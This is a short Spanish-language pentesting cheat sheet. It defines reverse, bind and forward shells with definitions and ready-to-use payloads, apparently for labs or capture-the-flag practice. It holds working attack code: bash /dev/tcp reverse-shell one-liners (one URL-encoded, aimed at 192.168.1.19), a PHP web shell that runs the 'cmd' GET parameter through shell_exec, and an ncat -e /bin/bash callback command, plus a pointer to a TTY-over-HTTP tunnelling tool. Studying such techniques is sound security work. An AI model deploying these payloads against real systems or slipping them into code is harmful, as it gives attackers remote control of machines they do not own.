#Explotacion #Shell
## Reverse Shell
#### Definición

>Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.
___________________________________

##### .SH

````shell
#!/bin/bash

bash -i >& /dev/tcp/<IP>/443 0>&1 
````

##### CMD
```shell
bash -c "bash -i >%26 /dev/tcp/192.168.1.19/443 0<%261"
```


## Bind Shell

#### Definición

>Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
____________________



## Forward Shell

#### Definición

>Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.
>______________________

Para la ejecución de este tipo de shell podemos cargar un archivo con la extensión `.php`, que nos permita la ejecución remota de comandos en el servidor.

```php
<?
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

Una vez lo ejecutamos podemos ejecutar comandos desde la web usando `?cmd=` y enviarnos una shell a nuestra maquina en la que estamos en escucha usando el comando `ncat -e /bin/bash <IP_local> <Puerto>`

No nos entablara conexión por que hay reglas de firewall de por medio, usaremos la herramienta https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py donde tendremos que hacer un único cambio en la ruta del archivo.

Deberemos de cambiar el formato de la shell quitando las etiquetas preformateadas  del código `.php`

```php
<?
        echo shell_exec($_GET['cmd']);
?>
```
